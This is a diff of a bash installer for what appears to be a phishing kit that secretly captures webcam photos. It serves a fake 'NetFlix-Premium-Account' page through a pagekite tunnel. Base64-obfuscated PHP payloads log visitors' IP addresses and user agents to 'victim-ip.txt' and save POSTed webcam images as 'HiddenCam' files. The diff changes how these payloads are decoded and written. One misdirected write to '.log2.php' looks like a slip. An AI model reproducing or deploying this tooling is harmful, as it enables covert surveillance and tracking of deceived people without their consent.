@@ -37,16 +37,36 @@ else
 curl -o .www/.pagekite https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
 fi
 
+# Create Files
+
+if [[ -e .www/index.php ]]; then
+echo ""
+else
+printf "<?php\ninclude '.camdata.php';\nheader('Location: NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
+fi
+
 if [[ -e .www/.camdata.php ]]; then
 echo ""
 else
-printf "<?php\n  $str = 'PD9waHAKCmlmICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKQogICAgewogICAgICAkaXBhZGRyZXNzID0gJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10uIlxyXG4iOwogICAgfQplbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpCiAgICB7CiAgICAgICRpcGFkZHJlc3MgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iXHJcbiI7CiAgICB9CmVsc2UKICAgIHsKICAgICAgJGlwYWRkcmVzcyA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJcclxuIjsKICAgIH0KJHVzZXJhZ2VudCA9ICIgVXNlci1BZ2VudDogIjsKJGJyb3dzZXIgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzcGFjZSA9ICJcclxuIjsKCgokZmlsZSA9ICcuLi92aWN0aW0taXAudHh0JzsKJHZpY3RpbSA9ICJJUDogIjsKJGZwID0gZm9wZW4oJGZpbGUsICdhJyk7Cgpmd3JpdGUoJGZwLCAkdmljdGltKTsKZndyaXRlKCRmcCwgJGlwYWRkcmVzcyk7CmZ3cml0ZSgkZnAsICR1c2VyYWdlbnQpOwpmd3JpdGUoJGZwLCAkYnJvd3Nlcik7CmZ3cml0ZSgkZnAsICRzcGFjZSk7CgpmY2xvc2UoJGZwKTs=';\n  echo base64_decode($str);\n?>" > .www/.camdata.php
+printf "<?php\n  " > .www/.log1.php
+printf "$" >> .www/.log1.php
+printf "str = 'PD9waHAKCmlmICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKQogICAgewogICAgICAkaXBhZGRyZXNzID0gJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10uIlxyXG4iOwogICAgfQplbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpCiAgICB7CiAgICAgICRpcGFkZHJlc3MgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iXHJcbiI7CiAgICB9CmVsc2UKICAgIHsKICAgICAgJGlwYWRkcmVzcyA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJcclxuIjsKICAgIH0KJHVzZXJhZ2VudCA9ICIgVXNlci1BZ2VudDogIjsKJGJyb3dzZXIgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzcGFjZSA9ICJcclxuIjsKCgokZmlsZSA9ICcuLi92aWN0aW0taXAudHh0JzsKJHZpY3RpbSA9ICJJUDogIjsKJGZwID0gZm9wZW4oJGZpbGUsICdhJyk7Cgpmd3JpdGUoJGZwLCAkdmljdGltKTsKZndyaXRlKCRmcCwgJGlwYWRkcmVzcyk7CmZ3cml0ZSgkZnAsICR1c2VyYWdlbnQpOwpmd3JpdGUoJGZwLCAkYnJvd3Nlcik7CmZ3cml0ZSgkZnAsICRzcGFjZSk7CgpmY2xvc2UoJGZwKTs=';\n  echo base64_decode(" >> .www/.log1.php
+printf "$" >> .www/.log2.php
+printf "str);\n?>" >> .www/.log1.php
+php .www/.log1.php > .www/.camdata.php
+rm -rf .www/.log1.php
 fi
 
 if [[ -e .www/.htrtech.php ]]; then
 echo ""
 else
-printf "<?php\n  $str = 'PD9waHAKCiRkYXRlID0gZGF0ZSgnaV9zX0gtZE1ZJyk7CiRpbWFnZURhdGE9JF9QT1NUWydjYXQnXTsKCmlmICghZW1wdHkoJF9QT1NUWydjYXQnXSkpIHsKZXJyb3JfbG9nKCJSZWNlaXZlZCIgLiAiXHJcbiIsIDMsICIuY2FtLmxvZyIpOwoKfQoKJGZpbHRlcmVkRGF0YT1zdWJzdHIoJGltYWdlRGF0YSwgc3RycG9zKCRpbWFnZURhdGEsICIsIikrMSk7CiR1bmVuY29kZWREYXRhPWJhc2U2NF9kZWNvZGUoJGZpbHRlcmVkRGF0YSk7CiRmcCA9IGZvcGVuKCAnLi4vaW1hZ2VzL0hpZGRlbkNhbS0nLiRkYXRlLicucG5nJywgJ3diJyApOwpmd3JpdGUoICRmcCwgJHVuZW5jb2RlZERhdGEpOwpmY2xvc2UoICRmcCApOwoKZXhpdCgpOwo/Pg==';\n  echo base64_decode($str);\n?>" > .www/.htrtech.php
+printf "<?php\n  " > .www/.log2.php
+printf "$" >> .www/.log2.php
+printf "str = 'PD9waHAKCiRkYXRlID0gZGF0ZSgnaV9zX0gtZE1ZJyk7CiRpbWFnZURhdGE9JF9QT1NUWydjYXQnXTsKCmlmICghZW1wdHkoJF9QT1NUWydjYXQnXSkpIHsKZXJyb3JfbG9nKCJSZWNlaXZlZCIgLiAiXHJcbiIsIDMsICIuY2FtLmxvZyIpOwoKfQoKJGZpbHRlcmVkRGF0YT1zdWJzdHIoJGltYWdlRGF0YSwgc3RycG9zKCRpbWFnZURhdGEsICIsIikrMSk7CiR1bmVuY29kZWREYXRhPWJhc2U2NF9kZWNvZGUoJGZpbHRlcmVkRGF0YSk7CiRmcCA9IGZvcGVuKCAnLi4vaW1hZ2VzL0hpZGRlbkNhbS0nLiRkYXRlLicucG5nJywgJ3diJyApOwpmd3JpdGUoICRmcCwgJHVuZW5jb2RlZERhdGEpOwpmY2xvc2UoICRmcCApOwoKZXhpdCgpOwo/Pg==';\n  echo base64_decode(" >> .www/.log2.php
+printf "$" >> .www/.log2.php
+printf "str);\n?>" >> .www/.log2.php
+php .www/.log2.php > .www/.htrtech.php
+rm -rf .www/.log2.php
 fi
 
 if [[ -e .www/NetFlix-Premium-Account.html ]]; then
@@ -99,8 +119,6 @@ exit 1
 fi
 fi
 fi
-# Create Files
-printf "<?php\ninclude '.camdata.php';\nheader('Location: NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
 
 printf " \n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installation Completed ...\e[0m\n"
